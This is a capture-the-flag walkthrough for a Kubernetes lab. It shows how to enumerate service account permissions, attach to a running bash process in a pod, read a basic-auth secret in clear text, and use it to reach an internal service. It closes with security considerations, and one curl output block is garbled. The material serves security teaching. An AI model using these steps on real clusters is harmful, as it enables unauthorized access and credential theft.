# Scenario: Commandeer Container

- [Learning Outcomes](#learning-outcomes)
- [Challenge Description](#challenge-description)
- [Guided Walkthrough](#guided-walkthrough)
  - [Step 1: Enumeration of Resources and Attach to the Misty Gally](#step-1-enumerate-resources-and-attach-to-the-misty-gally)
  - [Step 2: Discovery of a Service in Treasure Island](#step-2-discovery-of-a-service-in-treasure-island)
  - [Step 3: Accessing Basic Auth Secret](#step-3-accessing-basic-auth-secret)
  - [Step 4: Capture the Flag](#step-4-capture-the-flag)
- [Remediation and Security Considerations](#remediation-and-security-considerations)

## Learning Outcomes

The purpose of Commandeer Container is to teach participants about `kubectl attach` and how it can be used to access a container if the main running process is a tty session (e.g. bash). The scenario also covers basic service account permissions enumeration and understanding what resources you can access.

## Challenge Description

```
                            _.--.
                        _.-'_:-'||
                    _.-'_.-::::'||
               _.-:'_.-::::::'  ||
             .'`-.-:::::::'     ||
            /.'`;|:::::::'      ||_
           ||   ||::::::'     _.;._'-._
           ||   ||:::::'  _.-!oo @.!-._'-.
           \'.  ||:::::.-!()oo @!()@.-'_.|
            '.'-;|:.-'.&$@.& ()$%-'o.'\U||
              `>'-.!@%()@'@_%-'_.-o _.|'||
               ||-._'-.@.-'_.-' _.-o  |'||
               ||=[ '-._.-\U/.-'    o |'||
               || '-.]=|| |'|      o  |'||
               ||      || |'|        _| ';
               ||      || |'|    _.-'_.-'
               |'-._   || |'|_.-'_.-'
                '-._'-.|| |' `_.-'
                    '-.||_/.-'

Welcome to Captain Hλ$ħ𝔍Ⱥ¢k's Booty Camp!

There is treasure to be had to those who can smuggle aboard and find the map.

It's time to show Dread Pirate what you've learnt about Kubernetes.
```

## Guided Walkthrough

### Step 1: Enumerate Resources and Attach to the Misty Gally

The first step is to enumerate resources. Looking through the file system of the container does not reveal anything useful but we can review the permissions of the service account by using:

```bash
kubectl auth can-i --list

Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
namespaces                                      []                                    []               [get list]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]

```

Other than the default service account permissions, we have permissions to `get` and `list` namespaces. We can see what namespaces are available by using:

```bash
kubectl get namespaces

NAME              STATUS   AGE
default           Active   24m
kube-node-lease   Active   24m
kube-public       Active   24m
kube-system       Active   24m
sea               Active   22m
smugglers-cove    Active   22m
treasure-island   Active   22m
```

We'll focus on the non-standard namespaces to start with (`sea`, `smugglers-cove` and `treasure-island`). We can see what permissions we have in each namespace by adding the namespace flag (`-n`) at the end of the `auth can-i` command.

> TIP: `kubectl` commands are usual bound to a namespace. But default, this is set to the `default` namespace. For example, executing `kubectl get pods` will get any pods within the `default` namespace. There are exceptions to this such as `kubectl get namespaces` is getting all the namespaces.

```bash
kubectl auth can-i --list -n smugglers-cove
Resources                                       Non-Resource URLs                     Resource Names   Verbs
pods/attach                                     []                                    []               [create patch delete]
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
pods                                            []                                    []               [get list watch]
namespaces                                      []                                    []               [get list]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
```

Only the `smugglers-cove` namespace returns anything of interest. We can see the service account has permissions to look at the pods in that namespace and also `pods/attach`. Let's first see if there is a pod within the namespace by running:

```bash
kubectl get pods -n smugglers-cove
NAME          READY   STATUS    RESTARTS   AGE
misty-gally   1/1     Running   0          37m
```

There is a pod running called the misty-gally. We can look at the pod configuration even further by running:

> Note: Your configuration may vary in comparsion to what is shown below.

```bash
kubectl get pods -n smugglers-cove -oyaml
apiVersion: v1
items:
- apiVersion: v1
  kind: Pod
  metadata:
    annotations:
      cni.projectcalico.org/containerID: 1722b91e892d04467a369e5aadc4f383151dbfa1e98cf2bce91c4c0a16aca049
      cni.projectcalico.org/podIP: 192.168.11.193/32
      cni.projectcalico.org/podIPs: 192.168.11.193/32
      kubectl.kubernetes.io/last-applied-configuration: |
        {"apiVersion":"v1","kind":"Pod","metadata":{"annotations":{},"name":"misty-gally","namespace":"smugglers-cove"},"spec":{"containers":[{"command":["/bin/bash"],"image":"docker.io/controlplaneoffsec/scenario-commandeer-container:misty-gally","name":"hold","securityContext":{"allowPrivilegeEscalation":false},"stdin":true,"tty":true}],"restartPolicy":"Always","serviceAccountName":"cartographer"}}
    creationTimestamp: "2023-11-05T21:32:59Z"
    name: misty-gally
    namespace: smugglers-cove
    resourceVersion: "840"
    uid: 8d1d2f52-df73-4f06-a07c-62381464ff7f
  spec:
    containers:
    - command:
      - /bin/bash
      image: docker.io/controlplaneoffsec/scenario-commandeer-container:misty-gally
      imagePullPolicy: IfNotPresent
      name: hold
      resources: {}
      securityContext:
        allowPrivilegeEscalation: false
      stdin: true
      terminationMessagePath: /dev/termination-log
      terminationMessagePolicy: File
      tty: true
      volumeMounts:
      - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
        name: kube-api-access-9nkkk
        readOnly: true
    dnsPolicy: ClusterFirst
    enableServiceLinks: true
    nodeName: k8s-node-0
    preemptionPolicy: PreemptLowerPriority
    priority: 0
    restartPolicy: Always
    schedulerName: default-scheduler
    securityContext: {}
    serviceAccount: cartographer
    serviceAccountName: cartographer
    terminationGracePeriodSeconds: 30
    tolerations:
    - effect: NoExecute
      key: node.kubernetes.io/not-ready
      operator: Exists
      tolerationSeconds: 300
    - effect: NoExecute
      key: node.kubernetes.io/unreachable
      operator: Exists
      tolerationSeconds: 300
    volumes:
    - name: kube-api-access-9nkkk
      projected:
        defaultMode: 420
        sources:
        - serviceAccountToken:
            expirationSeconds: 3607
            path: token
        - configMap:
            items:
            - key: ca.crt
              path: ca.crt
            name: kube-root-ca.crt
        - downwardAPI:
            items:
            - fieldRef:
                apiVersion: v1
                fieldPath: metadata.namespace
              path: namespace
  status:
    conditions:
    - lastProbeTime: null
      lastTransitionTime: "2023-11-05T21:32:59Z"
      status: "True"
      type: Initialized
    - lastProbeTime: null
      lastTransitionTime: "2023-11-05T21:33:08Z"
      status: "True"
      type: Ready
    - lastProbeTime: null
      lastTransitionTime: "2023-11-05T21:33:08Z"
      status: "True"
      type: ContainersReady
    - lastProbeTime: null
      lastTransitionTime: "2023-11-05T21:32:59Z"
      status: "True"
      type: PodScheduled
    containerStatuses:
    - containerID: containerd://0e982f9503f0fcc4ec1a4f1a895904434f219a2f6b8e2b3f33fd1651108941d7
      image: docker.io/controlplaneoffsec/scenario-commandeer-container:misty-gally
      imageID: docker.io/controlplaneoffsec/scenario-commandeer-container@sha256:3a2c090c2fafd01831d726a6be6dfade9a6ba93712b6c69c4359953b6c629093
      lastState: {}
      name: hold
      ready: true
      restartCount: 0
      started: true
      state:
        running:
          startedAt: "2023-11-05T21:33:07Z"
    hostIP: 172.31.2.31
    phase: Running
    podIP: 192.168.11.193
    podIPs:
    - ip: 192.168.11.193
    qosClass: BestEffort
    startTime: "2023-11-05T21:32:59Z"
kind: List
metadata:
  resourceVersion: ""
```

From the output we can see that the pod has a container running called `hold` and it is running the command `/bin/bash`. But there isn't anything more significant (e.g. the container is not running `privileged`, nor does it have any interesting mount directories). We cannot `exec` into the pod but we can use `attach`. From the [Kubernetes Reference documentation](https://kubernetes.io/docs/reference/generated/kubectl/kubectl-commands#attach), we can see that `kubectl attach` allows the user to *"Attach to a process that is already running inside an existing container."*.

To attach to the container in the pod, we can run the following command:

```bash
kubectl attach -it misty-gally -c hold -n smugglers-cove
If you don't see a command prompt, try pressing enter.
stowaway@misty-gally:/$
```

And we now have attached to the `/bin/bash` process for a interactive session in the `misty-gally`.

### Step 2: Discovery of a Service in Treasure Island

With access to the `misty-gally`, we can enumerate the service account permissions. **REMEMBER** we need to specify the namespaces we discovered earlier: `sea`, `smugglers-cove` and `treasure-island`.

```bash
kubectl auth can-i --list -n treasure-island
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
secrets                                         []                                    []               [get list]
services                                        []                                    []               [get list]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]

```

The `sea` and `smugglers-cove` namespaces return no results but the `treasure-island` has permissions to `get` and `list` secrets and services.

Let's first look for any services within the `treasure-island` namespace. This is done via:

```bash
kubectl get services -n treasure-island
NAME   TYPE       CLUSTER-IP     EXTERNAL-IP   PORT(S)          AGE
x      NodePort   10.99.122.71   <none>        8080:30901/TCP   53m
```

There is a service called `x` which is a `NodePort` with an exposed port 8080. A node port provides a way to expose a group of Pods to the outside world. This means from outside the cluster port 30901 is exposed and can be requested by anyone outside the cluster. As we are inside a pod and the default network in Kubernetes is open, we can just use the service port 8080. Another good sign is the service is called `x` so that normally "marks the spot" for treasure.

Port 8080 is normally associated with HTTP, so we can send an HTTP request via cURL:

> Note: The Cluster IP address of your service is dynamically provisioned and will likely be different in your cluster.

```bash
curl -v http://10.99.122.71:8080/
*   Trying 10.99.122.71:8080...
* Connected to 10.stowaway@misty-gally:/$ curl -v http://10.99.122.71:8080/login
*   Trying 10.99.122.71:8080...
* Connected to 10.99.122.71 (10.99.122.71) port 8080 (#0)
> GET /login HTTP/1.1
> Host: 10.99.122.71:8080
> User-Agent: curl/7.88.1
> Accept: */*
>
< HTTP/1.1 401 Unauthorized
< Content-Type: text/plain; charset=utf-8
< Www-Authenticate: Basic realm="restricted", charset="UTF-8"
< X-Content-Type-Options: nosniff
< Date: Sun, 05 Nov 2023 22:38:02 GMT
< Content-Length: 13
<
Unauthorized
* Connection #0 to host 10.99.122.71 left intact
99.122.71 (10.99.122.71) port 8080 (#0)
> GET / HTTP/1.1
> Host: 10.99.122.71:8080
> User-Agent: curl/7.88.1
> Accept: */*
>
< HTTP/1.1 421 Misdirected Request
< Content-Type: text/html; charset=utf-8
< Location: /loigin
< Date: Sun, 05 Nov 2023 22:36:22 GMT
< Content-Length: 44
<
<a href="/loigin">Misdirected Request</a>.

* Connection #0 to host 10.99.122.71 left intact
```

We received a `421 Misdirected Request` meaning that the end point could not redirected. Reviewing the endpoint it would seem to be mis-spelt so let's use `login` instead.

```bash
curl -v http://10.99.122.71:8080/login
*   Trying 10.99.122.71:8080...
* Connected to 10.99.122.71 (10.99.122.71) port 8080 (#0)
> GET /login HTTP/1.1
> Host: 10.99.122.71:8080
> User-Agent: curl/7.88.1
> Accept: */*
>
< HTTP/1.1 401 Unauthorized
< Content-Type: text/plain; charset=utf-8
< Www-Authenticate: Basic realm="restricted", charset="UTF-8"
< X-Content-Type-Options: nosniff
< Date: Sun, 05 Nov 2023 22:38:02 GMT
< Content-Length: 13
<
Unauthorized
* Connection #0 to host 10.99.122.71 left intact
```

This time we receive a `401 Unauthorized` which would indicate we need credentials to make a successful request to the `x` service.

### Step 3: Accessing Basic Auth Secret

From the `auth can-i` request, the service account has access to secrets. Let's have a look to see if we have a secret that could help us authenticate our request.

```bash
kubectl get secrets -n treasure-island
NAME   TYPE                       DATA   AGE
map    kubernetes.io/basic-auth   2      68m
```

The result show a secret called `map` and it is a `basic-auth` type secret. Kubernetes secrets are base64 encoded but for basic auth secrets, the values are annotated in the metadata in clear text. Runing the following command, shows that the username is set to `key` and the password is set to `6d7b235802dde35f659c76dfb67f46392407a81f8749bdbbc0ecd775abab1703`.

```bash
kubectl get secrets map -n treasure-island -ojson
{
    "apiVersion": "v1",
    "data": {
        "password": "NmQ3YjIzNTgwMmRkZTM1ZjY1OWM3NmRmYjY3ZjQ2MzkyNDA3YTgxZjg3NDliZGJiYzBlY2Q3NzVhYmFiMTcwMw==",
        "username": "a2V5"
    },
    "kind": "Secret",
    "metadata": {
        "annotations": {
            "kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"v1\",\"kind\":\"Secret\",\"metadata\":{\"annotations\":{},\"name\":\"map\",\"namespace\":\"treasure-island\"},\"stringData\":{\"password\":\"6d7b235802dde35f659c76dfb67f46392407a81f8749bdbbc0ecd775abab1703\",\"username\":\"key\"},\"type\":\"kubernetes.io/basic-auth\"}\n"
        },
        "creationTimestamp": "2023-11-05T21:32:59Z",
        "name": "map",
        "namespace": "treasure-island",
        "resourceVersion": "776",
        "uid": "f165cc9a-db99-49c9-8511-c1ac4c3c77c9"
    },
    "type": "kubernetes.io/basic-auth"
}
```

We now have the credentials to query the `x` service.

### Step 4: Capture the Flag

We can now use the basic authentication username and password with our cURL request. To do this, we need to use the -u option with "login:password" where "login" and "password" are your credentials.

```bash
*   Trying 10.99.122.71:8080...
* Connected to 10.99.122.71 (10.99.122.71) port 8080 (#0)
* Server auth using Basic with user 'key'
> GET /login HTTP/1.1
> Host: 10.99.122.71:8080
> Authorization: Basic a2V5OjZkN2IyMzU4MDJkZGUzNWY2NTljNzZkZmI2N2Y0NjM5MjQwN2E4MWY4NzQ5YmRiYmMwZWNkNzc1YWJhYjE3MDM=
> User-Agent: curl/7.88.1
> Accept: */*
>
< HTTP/1.1 200 OK
< Date: Sun, 05 Nov 2023 22:51:14 GMT
< Content-Length: 44
< Content-Type: text/plain; charset=utf-8
<
flag_ctf{ATTACH_4_ACCESS_2_TREASURE_GALORE}
* Connection #0 to host 10.99.122.71 left intact
```

Congratulations, you have captured the flag and solved Commandeer Container.

## Remediation and Security Considerations

This CTF scenario does not have a remediation plan as it is to demonstrate another method to accessing a container in a pod as well as how to enumerate service account permissions. But important security considerations.

- If a containers primary running process is a tty session and a user has right level of permissions (`pod/attach`), then they will be able to obtain local interactive access to that container
- Be careful with the permissions you grant service accounts. If a pod is compromised, an adversary can leverage the permissions to perform malicious actions on the cluster. Where possible, use the default account.
- Kubernetes Secrets are base64 encoded and are not secure, be careful with how you use them and who you grant access to secrets
